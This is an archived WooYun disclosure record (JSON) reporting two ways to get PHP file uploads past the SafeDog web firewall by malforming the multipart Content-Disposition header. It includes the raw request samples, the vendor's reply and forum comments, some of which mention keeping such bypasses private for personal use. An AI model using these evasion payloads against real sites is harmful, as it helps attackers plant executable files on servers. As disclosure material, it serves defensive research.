{"id": 71198, "wybug_id": "wooyun-2015-0136073", "wybug_title": "网站安全狗上传拦截bypass(两种姿势)", "wybug_corp": "安全狗", "wybug_author": "JoyChou", "wybug_date": "2015-08-22 15:26", "wybug_open_date": "2015-11-22 09:02", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向公众公开  简要描述： 在第一弹中，我们可以通过大小写进行bypass。那第二弹呢？ 详细说明：  姿势一、大家还记得之前在zone上，有人将form-data改为f+orm-data进行绕过的case吗？所以google下Content-Disposition的value，发现有很多，每个都能上传成功，并且绕过。http://www.iana.org/assignments/cont-disp/cont-disp.xhtml#cont-disp-1最后，发现原来Content-Disposition的值可以为空。最后知道真相的我眼泪掉下来。\n------WebKitFormBoundarysnXY4rAshTKCPSr1Content-Disposition: name=\"file\"; filename=\"bypass.php\"Content-Type: application/octet-stream<?php  echo 'bypass safedog upload ';?>------WebKitFormBoundarysnXY4rAshTKCPSr1\n姿势二、在Content-Disposition:后添加多个空格  或者在form-data;后添加多个空格\n------WebKitFormBoundarysnXY4rAshTKCPSr1Content-Disposition: form-data;   name=\"file\"; filename=\"bypass.php\"Content-Type: application/octet-stream<?php  echo 'bypass safedog upload ';?>------WebKitFormBoundarysnXY4rAshTKCPSr1\n   漏洞证明：  \n\n\n\n\n\n   修复方案：  考虑综上情况   版权声明：转载请注明来源 JoyChou@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-08-24 09:01 厂商回复： 恩，没错，您的测试方向是对的，不过这个问题我们之前就已经知悉，将尽快进行修复。然后也很感谢您的提交。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-27 10:40 |    \t\tSnow陈伦 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 闷骚的家伙，何处都是你的战场。)\t\t \n  看了很多站普及度很高的都是安全dog，我等ITDOG无法直视。    \n     2015-08-27 10:49 |    \t\tagnes \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:2        | 啊，啊)\t\t \n  为了1rank，值吗    \n     2015-08-27 18:50 |    \t\tqdq \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 有关部门)\t\t \n  提交一个少一个，何必呢？    \n     2015-08-27 22:00 |    \t\tLinv2 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | Null)\t\t \n  我手里有个安全狗iis版上传的，舍不得曝啊    \n     2015-08-27 22:08 |    \t\twy007 \t\t\t( 普通白帽子  |\t\t\t        Rank:108 漏洞数:11        | 其实我是一名卧底...)\t\t \n  @Linv2 现在你可以虐安全狗，报出来之后你就要被虐了    \n     2015-08-28 17:23 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  跪舔jc老湿    \n     2015-08-29 16:03 |    \t\thuoji \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:10        | 目标是当个农民)\t\t \n  早知道 我就提交了一直留着为自己用 没想到被别人提交了    \n     2015-09-01 15:18 |    \t\t兔小白 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:3        | 搜片就到 www.sougaoqing.com)\t\t \n  他们知道为什么不补？有人报了在处理？想不明白    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}